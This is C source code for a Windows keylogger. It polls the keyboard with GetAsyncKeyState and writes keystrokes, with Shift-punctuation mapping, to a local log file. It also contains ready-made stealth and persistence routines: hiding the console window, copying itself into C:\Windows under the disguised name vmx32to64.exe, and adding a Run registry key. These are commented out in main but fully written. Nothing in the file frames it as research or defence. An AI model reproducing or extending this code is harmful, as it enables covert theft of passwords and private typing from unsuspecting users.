#include <windows.h>
#include <stdio.h>
#include <ctype.h>  // For isprint() function

#define LOGFILE "log.txt"
#define OLDFILE "key.exe"
#define NEWFILE "C:\\Windows\\vmx32to64.exe"

// Previous key state to prevent logging the same key repeatedly
int previousKey = 0;
int shiftPressed = 0;  // Track the state of the Shift key
int altPressed = 0;    // Track the state of the Alt key

// Function to log keys into a file
void logKey(char *input) {
    FILE *file = fopen(LOGFILE, "a");  // Open file in append mode
    if (file) {
        fputs(input, file);  // Write to file
        fclose(file);  // Close file
    }
}

// Function to handle special keys
int handleSpecialKeys(int key) {
    switch (key) {
        case VK_SPACE:      logKey(" "); return 1;
        case VK_RETURN:     logKey("\n"); return 1;
        case VK_SHIFT:
            if (!shiftPressed) {  // Only log SHIFT once when pressed
                logKey("[SHIFT]"); 
                shiftPressed = 1;  // Mark Shift as pressed
            }
            return 1;
        case VK_BACK:       logKey("[BACKSPACE]"); return 1;
        case VK_TAB:        logKey("[TAB]"); return 1;
        case VK_CAPITAL:    logKey("[CAPS_LOCK]"); return 1;
        case VK_UP:         logKey("[UP_ARROW]"); return 1;
        case VK_DOWN:       logKey("[DOWN_ARROW]"); return 1;
        case VK_LEFT:       logKey("[LEFT_ARROW]"); return 1;
        case VK_RIGHT:      logKey("[RIGHT_ARROW]"); return 1;
        case VK_CONTROL:    logKey("[CTRL]"); return 1;
        case VK_MENU:
            if (!altPressed) {  // Only log ALT once when pressed
                logKey("[ALT]"); 
                altPressed = 1;  // Mark Alt as pressed
            }
            return 1;
        default: return 0;  // Return 0 if it's not a special key
    }
}

// Function to set registry persistence
void setRegistryPersistence() {
    HKEY hKey;
    char path[MAX_PATH];

    GetModuleFileName(NULL, path, MAX_PATH);  // Get current executable path

    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "vmx32to64", 0, REG_SZ, (LPBYTE)path, sizeof(path));  // Set registry key
        RegCloseKey(hKey);
    }
}

// Function to copy the executable to a system directory
void copyToSystemLocation() {
    CopyFile(OLDFILE, NEWFILE, FALSE);  // Copy itself to Windows directory
}

// Function to hide the console window
void hideConsole() {
    HWND stealth;
    stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);
}

// Function to handle key press
void handleKeyPress(int key) {
    if (!handleSpecialKeys(key)) {
        // If the key is a printable character
        if (isprint(key)) {
            char keyChar[2] = {0};

            // If Shift is pressed, check if the character needs to be uppercased or not
            if (shiftPressed) {
                // Handle shift with punctuation characters like !, @, #, ?, etc.
                switch (key) {
                    case '1': keyChar[0] = '!'; break;
                    case '2': keyChar[0] = '@'; break;
                    case '3': keyChar[0] = '#'; break;
                    case '4': keyChar[0] = '$'; break;
                    case '5': keyChar[0] = '%'; break;
                    case '6': keyChar[0] = '^'; break;
                    case '7': keyChar[0] = '&'; break;
                    case '8': keyChar[0] = '*'; break;
                    case '9': keyChar[0] = '('; break;
                    case '0': keyChar[0] = ')'; break;
                    case '-': keyChar[0] = '_'; break;
                    case '=': keyChar[0] = '+'; break;
                    case '[': keyChar[0] = '{'; break;
                    case ']': keyChar[0] = '}'; break;
                    case '\\': keyChar[0] = '|'; break;
                    case ';': keyChar[0] = ':'; break;
                    case '\'': keyChar[0] = '"'; break;
                    case ',': keyChar[0] = '<'; break;
                    case '.': keyChar[0] = '>'; break;
                    case '/': keyChar[0] = '?'; break;  // Handling the question mark
                    default: keyChar[0] = (char)toupper(key);  // For letters
                }
                logKey(keyChar);
                shiftPressed = 0;  // Reset Shift state after logging
            } else {
                keyChar[0] = (char)key;
                logKey(keyChar);
            }
        }
    }
}

// Function to reset Shift/Alt key states when released
void handleKeyRelease(int key) {
    if (key == VK_SHIFT) {
        shiftPressed = 0;  // Mark Shift as released
    } else if (key == VK_MENU) {
        altPressed = 0;  // Mark Alt as released
    }
}

int main() {
    //hideConsole();  // Hide the console
    //copyToSystemLocation();  // Copy itself to system directory
    //setRegistryPersistence();  // Add itself to Windows startup

    while (1) {
        Sleep(10);  // Small delay to prevent CPU overuse

        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {  // Detect key press
                // If it's a new key press, log it
                if (key != previousKey) {
                    handleKeyPress(key);
                    previousKey = key;  // Update the previous key to the current one
                }
            } else if (key == previousKey) {
                // If key is released, reset previous key
                handleKeyRelease(key);
                previousKey = 0;
            }
        }
    }

    return 0;
}